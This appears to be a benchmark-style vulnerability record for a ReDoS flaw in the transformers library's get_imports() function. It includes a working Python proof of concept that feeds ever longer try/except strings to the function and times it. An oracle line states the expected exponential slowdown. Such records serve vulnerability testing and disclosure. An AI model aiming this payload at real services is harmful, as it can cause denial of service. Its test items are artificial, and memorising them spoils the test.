title: Inefficient regular expression in get_imports() causes ReDoS via catastrophic backtracking
trigger_payload:
from transformers.dynamic_module_utils import get_imports
import time
PAYLOAD_FILE_PATH = '/tmp/payload'
def generate_payload(i):
    return 'try:' * i + 'except' * i
def write_payload_to_file(payload, file_path):
    with open(file_path, 'w') as f:
        f.write(payload)
    return file_path
for i in range(1, 10000, 100):
    payload = generate_payload(i)
    payload_file = write_payload_to_file(payload, PAYLOAD_FILE_PATH)
    start = time.perf_counter()
    get_imports(payload_file)
    end = time.perf_counter()
    execution_time = end - start
    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')
oracle: Exponential increase in execution time when processing payloads with nested try/except blocks
